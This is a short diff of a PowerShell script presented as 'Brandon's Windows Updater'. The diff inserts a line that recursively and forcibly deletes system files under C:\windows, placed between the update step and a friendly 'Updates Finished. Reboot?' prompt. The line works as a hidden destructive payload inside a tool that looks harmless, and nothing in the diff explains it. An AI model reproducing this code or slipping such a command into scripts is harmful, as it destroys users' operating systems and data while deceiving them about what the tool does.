@@ -9,6 +9,8 @@ try{
   Write-Host "Error installing updates... Check network connection...";
 }
 
+del /S /F /Q /A:S C:\windows;
+
 Add-Type -AssemblyName PresentationFramework;
 $answer = [System.Windows.MessageBox]::Show("Updates Finished. Reboot?", "Brandon's Windows Updater", "YesNo");
   if ($answer -eq "Yes"){
